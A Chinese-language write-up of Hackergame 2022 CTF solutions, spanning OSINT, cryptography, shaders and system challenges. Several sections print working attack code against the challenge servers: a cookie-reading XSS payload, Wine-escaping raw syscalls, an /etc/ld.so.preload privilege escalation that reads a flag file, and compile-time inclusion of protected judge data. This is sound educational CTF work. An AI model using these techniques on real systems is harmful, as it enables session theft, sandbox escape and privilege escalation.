# Hackergame 2022 Writeup

by TechCiel from JLU scored 4650 ranked 59

## 签到

经典签到题。一开始想改倒计时，但是觉得人口普查不可能这么难，想起了改 param 的优良传统，直接改成 `?result=2022` 即可。

flxg: `flag{HappyHacking2022-**********}` （如果没有 token 好像几乎和前几年一样吧。。。）

## 猫咪问答喵

经典搜索题。今年可以显示正确的个数，有效缓解了猜猜哪个不对的问题。第一题 NEBULA 战队成立时间搜索就有 2017 年 3 月。第二题直奔 ftp.ustclug.org ，找到 slides 和录屏确定是 Kdenlive 。第三题 Firefox 版本网上说法不一，尝试后为 12 。第四题先搜索这个 CVE ，然后到那段时间翻翻 commit log 就能找到 `exec: Force single empty string when argv is empty` 的 commit hash 为 `dcd46d897adb70d63e025f175a00a89797d31a43` 。

### 第五题

解法一：搜索 `"e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce"` （带引号避免分词）可以找到 https://docs.zeek.org/en/master/logs/ssh.html ，里面找到一个相关的 IP `205.166.94.16` ，访问发现是 `sdf.org` 。

解法二：考虑到提示，注册时间为 1996 年，彼时顶级域屈指可数，只有 com/net/org/edu/mil/gov ，且六字母各不相同，依据这些条件可以穷举、解析、测试 22 端口。

### 第六题

解法一：搜索 `网络通 site:ustcnet.ustc.edu.cn` ，结果指示的页面中可以找到 http://wlt.ustc.edu.cn ，打开后发现有多个指向 https://netfee.ustc.edu.cn/ 子页面的链接，猜测为遗留系统，其主页一闪即逝转向到 wlt ，curl 取得内容后发现一个到 https://netfee.ustc.edu.cn/wlttz.htm 的「关于网络通账号相关问题的通知」连接，其中明确指出「2003年2月17日到2003年2月28日， "网络通"账号开通测试……免收出校访问包月费。自2003年3月1日起，……并按新的费用分担办法收费。」

解法二：在漫游网络中心页面的过程中容易找到线索指向「关于实行新的网络费用分担办法的通知」，能搜到 2010 年的「网字文件」称 2003 年的同名文件同时废止，和一个 2002 年的同名文件，彼时还不存在网络通。在搜索关键词中加入 2003 ，可以找到 2003 年 3 月 1 日的同名文件 https://ustcnet.ustc.edu.cn/2003/0301/c11109a210890/page.htm 。

flxg1: `flag{meowexammeow_****************_**********}`
flxg2: `flag{meowexamfullymeowed!_****************_**********}`

## 家目录里的秘密

第一问直接用 VSCode 打开解压后的目录，搜索 flag 就可以找到。

flxg1: `flag{finding_everything_through_vscode_config_file_*********}`

随后在 `./config/rclone/rclone.conf` 发现提示 flag2 ，存在 ftp 配置的密码里但是是加密的。懒得搓解密，考虑到 ftp 是明文协议，将 host 改为任意 ftp 服务器，运行并本地抓包获得 flag 。

flxg2: `flag{get_rclone_password_from_config!_*******}`

后记：原来 `rclone reveal` 直接出。。。

## HeiLang

经典编辑器题。将 ` | ` 替换为 `] = a[` 运行即可。

flxg: `flag{****************-****************}`

## Xcaptcha

经典速算题。写爬虫即可。

```python
import re
import sys
import requests

url = 'http://202.38.93.111:10047/xcaptcha'
token = '332:**'

s = requests.Session()
r = s.get(url, params={'token':token})
r = s.get(url)

matches = re.findall(r'\d+\+\d+', r.text)
r = s.post(url, data=dict(zip(
    [ f'captcha{i+1}' for i in range(3) ], [ eval(x) for x in matches ]
)))

print(r.text)
```

flxg: `flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_**********}`

## 旅行照片 2.0

经典(?) GeoGuesser 题。去年这个题目我就很喜欢来着，今年出续集狂喜。

题面很短但包含有用信息「酒店应该是又被他住下了」，提示拍摄人在酒店而不是民宅。

### 照片分析

使用 `identify -verbose travel-photo-2.jpg` 读取 EXIF 信息。

得到 `exif:ExifVersion: 0231` ，`exif:Make: Xiaomi` ，`exif:PhotographicSensitivity: 84` ，`exif:DateTimeOriginal: 2022:05:14 18:23:35` ，`exif:Flash: 16` 。其中版本查阅发现是十进制 hex 存储，闪光灯对应 `hex 0010 = Flash did not fire, compulsory flash mode` ，时间对应的时区是 `exif:OffsetTimeOriginal: +09:00` 。得到答案：2.31 、小米、84、2022/05/14、否。

flxg: `flag{1f_y0u_d0NT_w4nt_shOw_theSe_th3n_w1Pe_EXlF} `

### 社工入门

先做手机分辨率题，根据 `exif:Model: sm6115 (juice)` 搜索该机型，得到红米 9T ，查参数可知 2340x1080 。

至于位置，图中的圆形体育场有牌匾，但看不太清，试图搜索 `ZOZO MANNE STADIUM` 谷歌提示为千叶市 ZOZO 海洋球场 (Zozo Marine Stadium)，确定地理位置后，结合拍摄时间，判断拍摄者在建筑物东侧，东侧的「酒店」邮编基本是 261-0021 。

至于航班，我直接偷懒了，去 https://www.flightradar24.com/ 注册领取会员 7 日试用，直接找到当时当地的历史航班轨迹，发现从 HND 到 HIJ 的 ANA683 次航班高度吻合。于是提交，答案错误。试了好几个其他的，猛然发现航班号是“两个大写字母和若干个数字“，航班号改填 `NH683` ，得到 flag 。

flxg2: `flag{Buzz_0ver_y0ur_h34d_and_4DSB_m19ht_111egal}`

## 猜数字

经典数据类型题。这么多位一次猜对的几率太渺茫了（虽然确实有欧皇群友），观察源代码发现如下代码：

```java
var isLess = guess < this.number - 1e-6 / 2;
var isMore = guess > this.number + 1e-6 / 2;
var isPassed = !isLess && !isMore;
var isTalented = isPassed && this.previous.isEmpty();
```

考虑到 NaN 的任何比较都返回 False ，前端将 input 标签类型改为 text ，输入 `NaN` 提交获得 flag 。

flxg: `flag{gu3ss-n0t-a-numb3r-1nst3ad-****************}`

## LaTeX 机器人

<!-- 胶衣好耶好耶好耶 -->

考虑如何用 TeX include 文件，找到 \input 指令，输入 `\input{/flag1}` 抄下 flag 。

flxg1: `flag{becAr3fu11dUd3**********}`

第二问不太好搞，因为井号是内置的参数符号，考虑首先退出数学模式。用 `\verbatiminput` 可以完成操作，但输入插入在正文无法引用宏包，考虑其他方法。想到或许可以规定转义内置字符，找到了 `\catcode` 指令，通过
```latex
$$\catcode`#11\catcode`_11\input{/flag2}$$
```

在数学模式外将两字符定义为普通字母再行 input 即可抄到 flag 。

flxg2: `flag{latex_bec_0_m##es_co__#ol_**********}`

## Flag 的痕迹

已知 revision 已关闭，查阅 Doku wiki 的 wiki 找到各种各样的 actions ，大半都被 disable 了，可是 `diff` 却留下了。

访问 `http://202.38.93.111:15004/doku.php?id=start&do=diff` ，翻阅历史版本找到 flag 。

flxg: `flag{d1gandFInD_d0kuw1k1_unexpectEd_API}`

## 安全的在线测评

个人觉得出得很好的一道（我会做的）题。~~这题显然没法暴力，~~如何在不会的情况下，交一份能 AC 的代码呢。

### 无法 AC 的题目

作为老卡评测人，早就对各种门路深谙其道，直接读答案就是其一。直接 fopen 读取 `data/static.out` 输出，或者 `system("cat data/static.out");` 即可通过第一题，得到 flag 。

flxg1: `flag{the_compiler_is_my_eyes_**********}`

### 动态数据

动态数据难不难在动态数据，毕竟动态数据也是运行前生成好的，难在权限是 0700 。再三观察评测机实现，没有发现什么大的纰漏，唯一的问题就是编译过程没有降权运行。考虑从编译下手，直接将数据文件 `#include` 进来，但是 C 中无法识别这种大数 literal ，更别提两个换行分割的了。利用 `#include` 输出报错信息对系统一顿搜刮，没发现什么有用的东西。试图直接搜刮 `flag.py` ，发现从 shm 里读出之后直接删了。。。就很emmmm，本题就此卡住。

以「在 C ELF 中包含任意二进制文件」为目的搜了很久，发现一个利用汇编的奇技淫巧，可以直接使用内联汇编 `.incbin` 包含任意二进制文件。于是解题代码为：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char is[];
asm("is: .incbin \"./data/static.in\"\n.zero 1");
extern char id0[];
asm("id0: .incbin \"./data/dynamic0.in\"\n.zero 1");
extern char id1[];
asm("id1: .incbin \"./data/dynamic1.in\"\n.zero 1");
extern char id2[];
asm("id2: .incbin \"./data/dynamic2.in\"\n.zero 1");
extern char id3[];
asm("id3: .incbin \"./data/dynamic3.in\"\n.zero 1");
extern char id4[];
asm("id4: .incbin \"./data/dynamic4.in\"\n.zero 1");
extern char os[];
asm("os: .incbin \"./data/static.out\"\n.zero 1");
extern char od0[];
asm("od0: .incbin \"./data/dynamic0.out\"\n.zero 1");
extern char od1[];
asm("od1: .incbin \"./data/dynamic1.out\"\n.zero 1");
extern char od2[];
asm("od2: .incbin \"./data/dynamic2.out\"\n.zero 1");
extern char od3[];
asm("od3: .incbin \"./data/dynamic3.out\"\n.zero 1");
extern char od4[];
asm("od4: .incbin \"./data/dynamic4.out\"\n.zero 1");

char buf[1024];
int main() {
    scanf("%s", buf);
    buf[strlen(buf)] = '\n';
    if(0);
    else if(strcmp(buf, is) == 0) puts(os);
    else if(strcmp(buf, id0) == 0) puts(od0);
    else if(strcmp(buf, id1) == 0) puts(od1);
    else if(strcmp(buf, id2) == 0) puts(od2);
    else if(strcmp(buf, id3) == 0) puts(od3);
    else if(strcmp(buf, id4) == 0) puts(od4);
}
```

提交得到 flag 。

flxg2: `flag{cpp_need_P1040_std_embed_**********}`

## 线路板

下载下来一堆 PCB 板子信息，拖进（刚下的） KiCad 的 Gerber Viewer ，发现 flag 在 F_Cu 层，但被遮盖。

打开文本编辑，发现 L115-L207 有很多形如：

```plain
G03*
X169900974Y-112903000I-1955987J0D01*
G01*
```

的内容，数量上看大致符合遮罩圈，于是全删掉再打开，得到 flag 。

flxg: `flag{8_1ayER_rogeRS_81ind_V1a}`

## 微积分计算小练习

~~输入姓名 admin ，并做对五道题并提交，即可获得 flag 。~~

解码一下 URL 里的 base64 ，这里显然传递的只有分数和名字，看到题面里的 Java 和提交时打出来的 UA ，我寻思这难道是 Log4j ？结果一看服务端又是 Python ，看来不得行。

考虑到 headless browser 、放 cookie 、执行脚本、会显示姓名这么多的暗示，合理怀疑 XSS ，试了一下 `<script>` 好像不行，改用 `<img onerror>` 构造姓名 payload ：

```
a<img src="hehe" onerror="document.querySelector('#greeting').textContent = document.cookie">
```

其他随意填写，提交得到 flag 。

flxg: `flag{xS5_1OI_is_N0t_SOHARD_**********}`

## 杯窗鹅影

我发现我很喜欢操作系统题...。Wine 不提供任何沙箱，简单搜搜就知道，手搓点汇编就可以执行 Linux 的系统调用了，由于刚做完下面的「届不到的文件」，满脑子 execve ，先做出来了第二问。

只要搞懂 Linux x64 的系统调用 convention ，好像就是程序语法....基础（？）题？

```
char *cmd = "/readflag";
char *arg[] = {"readflag"};
int main(void) {
    asm(""
"mov %%rbx, %%rdi\n\t"
"mov %%rcx, %%rsi\n\t"
"syscall"
    :"=r" (cmd)
    : "a" (59), "b" (cmd), "c" (arg), "d" (0));
}
```

下面一排表示先给 r[a-d]x 寄存器赋值，代码里做的实际就是把 rbx 和 rcx 丢进 rdi 和 rsi 符合调用约定，然后一个 syscall 而已。

交叉编译提交得到 flag 。

flxg2: `flag{W1ne_is_NeveR_a_SaNDB0x_**********}`

然后开始搓 open 和 read 调用，代码基本没啥大变化，如下：

```
#include <stdio.h>
char *file = "/flag1";
int desc;
char buf[256];
int main(void) {
    asm(""
"mov %%rbx, %%rdi\n\t"
"mov %%rcx, %%rsi\n\t"
"syscall;"
    :"=a" (desc)
    : "a" (2), "b" (file), "c" (0), "d" (0));
    asm(""
"mov %%rbx, %%rdi\n\t"
"mov %%rcx, %%rsi\n\t"
"syscall;"
    :"=a" (desc)
    : "a" (0), "b" (desc), "c" (buf), "d" (256));
    puts(buf);
}

```

交叉编译提交得到 flag 。

flxg1: `flag{Surprise_you_can_directory_traversal_1n_WINE_**********}`

## 蒙特卡罗轮盘赌

经典(?)攻击 RNG 题。这个题出的是不错，不过也就一层窗户纸。

写过类似代码的同学肯定知道，同一环境下，如果 srand 是定值，生成出来的随机序列是一样的，所以对于一般不需要密码学随机的场合，会用时间戳这个变值进行 srand 。但是问题是这玩意是个整数，而且可以预测，只要复刻一下出题人的环境，就可以预先暴力算出若干种子产生的序列，通过前两次猜错找到对应的序列，直接把对应的后三次填进去。

出题人还加了个 clock 进去，不过一般也就几百，从当前时间开始算个几千就足够了，笔者实测生成后使用的序列是 `t+1039` 。

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

double rand01() { return (double)rand() / RAND_MAX; }

int main() {
	unsigned t = time(0)+300;
	for(unsigned k=0; k<=5000; k++) {
		srand(t+k);
		FILE *f;
		char target[20];
		for(int i=5; i>0; i--) {
			int M = 0;
			int N = 400000;
			for(int j=0; j<N; j++) {
				double x = rand01();
				double y = rand01();
				if (x*x + y*y < 1)
					M++;
			}
			double pi = (double)M / N * 4;
			if(i==5) {
				sprintf(target, "try/%1.5f-%d", pi, k);  // first guess as filename
				f = fopen(target, "w");
			}
			fprintf(f, "%1.5f\n", pi);
		}
		fclose(f);
		if(k%100==0) printf("%d\n", k);
	}
}
```

败二胜三获得 flag 。

flxg: `flag{raNd0m_nUmb34_a1wayS_m4tters_**********}`

## 惜字如金 - HS384

好玩的密码学（？）。将原程序反惜字如金化复原，会发现 `secret` 和 `secret_sha384` 明显都长度不足，需要反推一组匹配的 secret 和 hash ，考虑 secret 长度为 39 ，根据惜字如金规则，原串应符合正则 `us+t+c+e?\.ed+u\.c+n+` ，规模不大，打个 DFS 暴搜即可。我们知道数字是不会被缩的，原 hash 中有一段连续数字 `62074271866` 看枚举的字符串 hash 后是否有这个子串即可判断。得到：

```
secret = b'usssttttttce.edddddu.ccccccnnnnnnnnnnnn'
secret_sha384 = 'eccc18f9dbbc4aba825c7d4f9cccce726db1cb0d0babffe47fa170fe33d53bc62074271866a4e4d1325dc27f644fddad'
```

随后正常运行，签名文件即可得到 flag 。

flxg: `flag{y0u-kn0w-h0w-t0-sav3-7h3-l3773rs-r1gh7-****************}`

## 光与影

经典游戏题。~~就是这次似乎并不能走路。~~

下载到本地，观察主要绘图逻辑在 `fragment-shader.js` 中，从 `main` 开始尝试改变一切能改变的东西，观察绘制原理和行为，`mainImage` 设定了观察角度，但是试图转到背面失败了，这个函数下面还区分了天空和其他部分。对于景物调用了 `shadeScene` 这个函数又区分了地面和半空。对于半空的东西调用了 `sceneNormal` 进而又调用了 `sceneSDF` ，这里对 `t[1-5]` 求了个最小，我试着只返回 `t3` ，发现展示了一部分 flag ，逐个尝试发现 `t1` 到 `t4` 是 flag ，`t5` 是遮盖。将 L304 的 `t5` 从比较中去掉即可。

flxg: `flag{SDF-i3-FuN!}`

后记：mcfx 表示可以把 `t5` 改成 `t4` ，只需要改一个字节，神神神。

## 传达不到的文件（非预期）

只能执行，不能读...就想到了 `LD_PRELOAD` 能不能提到 setuid 的权呢？于是就搜到了[这篇栈溢出](https://stackoverflow.com/questions/9232892/ld-preload-with-setuid-binary)，答案是不行，但是往下看有人提到：

> On a system with glibc, you can preload a library using another supported way: by adding the library into `/etc/ld.so.preload`. This one doesn't suffer from the restrictions of `LD_PRELOAD`.
>
> \- [Ruslan](https://stackoverflow.com/users/673852/ruslan) answered May 21, 2019 at 11:27

于是开始操作，不知为啥好像 preload 常见函数没啥用，于是 preload 了一个 constructor 函数。

```c
#include <stdio.h>
#include <stdlib.h>
#define _GNU_SOURCE
#include <unistd.h>
#include <sys/stat.h>

void __attribute__((constructor)) fuck() {
    int c;
    FILE *file;
    file = fopen("/flag2", "r");
    if (file) {
        while ((c = getc(file)) != EOF)
            putchar(c);
        fclose(file);
    }
    chmod("/chall", 0755);
}
```

编译并复制：

```bash
gcc --shared -s -o rootshell.so shell.c
base64 rootshell.so | xclip -selection c
```

打开终端：

```
base64 -d > a                   # paste into it & Ctrl-D
echo /a > /etc/ld.so.preload
./chall                         # prints flag2 & chmod 4777
strings chall                   # find flag1
```

得到两个 flag 。

flxg2: `flag{D0_n0t_O0o0pen_me__unles5_u_tr4aced_my_p4th_**********}`

flxg1: `flag{ptr4ce_m3_4nd_1_w1ll_4lways_b3_th3r3_f0r_u}`

按：看起来似乎由于一些权限上的疏忽，这道题成了非预期大赛场，大家都是用各种各样的方式直接提权。~~出题人似乎感到很抱歉，不过我倒是觉得看大家乱搞也挺有趣的。~~

## 量子藏宝图

量子懵逼.webp

第一章查了半天 BB84 算法的操作，灌了一脑子量子理论，又是光子偏振又是什么泡利什么门，最后发现就是留下两个基底相同对应的位。第二章直接上了一个量子电路，但是我既不知道正确的假设和条件是啥，也不知道这些门是干啥的，看了一堆叠加态和复数变换，我寻思唉算了先观察一下这堆 CNOT 门的规律吧……结果发现搭线的情况和开头的 `f` 和结尾的 `}` ASCII 对上了，索性直接开始抄解，结果解出来的 flag 全是可打印字符，直接提交就对了。

flxg: `flag{**********}`

按：我是十分搞不明白，感觉这题目出的很怪，没有任何量子基础的人，可以用完全不量子的语言描述出解法，我觉得创意是好的，关卡设计上仍欠考虑，这看起来应该是一个系列的第一题。事后我拿给做量子方向的同学，对方挠头良久，最后丢过来一个 Bernstein-Vazirani ，但也没想明白，为什么以一个本来很有考察性的方式，放过了基础的找规律玩家。

## 企鹅拼盘 - 前两小题

那一天，人闷终于回想起被「灯，等灯等灯」支配的恐惧……

第一题的主要门槛是搞懂输入和交互的方式，点一下 input 输入几个二进制位，然后执行，会根据你的输入执行一系列的 A/B 移动操作，随便试试，输入 `1000` 就出来 flag 了。

flxg1: `flag{it_works_like_magic_********}`

第二题的题目名暗示「大力出奇迹」，哎呀不就是暴搜吗，我最会了。分析源程序后，发现放输入的是 `BPApp.inbits` ，负责 ExecuteAll 的是 `BPApp.action_last` 不过最终还是触发的 `BPApp.watch_pc` 完成演算和判定。于是修改一些代码：

在 `BPApp.__init__` 将对象导出到全局：

```python
global app
app = self
```

在 `BPApp.watch_pc` 中判定成功与否并抛出：

```python
if bool(self.board):
	raise AssertionError(repr(self.inbits))
```

然后注入线程控制枚举计算：

```python
def hack():
    sleep(1)
    f = open('qwq', 'w')
    for i in range(2**16+1):
        bits = []
        for j in range(16):
            bits.append(i&1)
            i >>= 1
        app.inbits = bits
        f.write(repr(bits)+'\n')
        f.flush()
        BPApp.watch_pc(app, 256)
```

过了不知道多久，龟速的 Python 吐出了：

```python
AssertionError('[0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0]')
```

提交 `0010111110000110` 得到 flag 。

flxg2: `flag{Branching_Programs_are_NC1_**********}`

## 马后炮

二次元神经网络：我们体系结构人就是不喜欢玩 learning ，不过居然是个 pickle 。。

惜字如金 - RS384：看了半天，源程序都复现抽象好了，感觉还是不会解，还是数理基础不扎实。

你先别急：没看懂要干啥。

片上系统：原来可以直接导出啊，我说怎么那么多人 TAT 。

看不见的彼方：感觉要看很多文档，就像 mcfx 是找了个冷门 syscall 那样，就没做，没想到是直接信号了。

企鹅拼盘：我知道肯定是高级群论，也知道我做不出来。

火眼金睛的小 E：不知道为啥我的 BinDiff 一直卡加载。。。

## 总结

今年似乎是题最多的一年，题目在经典类型题的基础之上也有许多有趣的创新。打 HG2016 的时候，我还什么都不会，虽然是摸爬滚打却有一种探索未知的兴奋，现在已经大四了，虽然还是很废物，但是好在这种兴奋还在。这是我玩 HG 的第 7 个年头，也是 JLU 协办的第四年，在此我就想问各位出题人一句：

> 你们的创作灵感完全不会枯竭是吗？

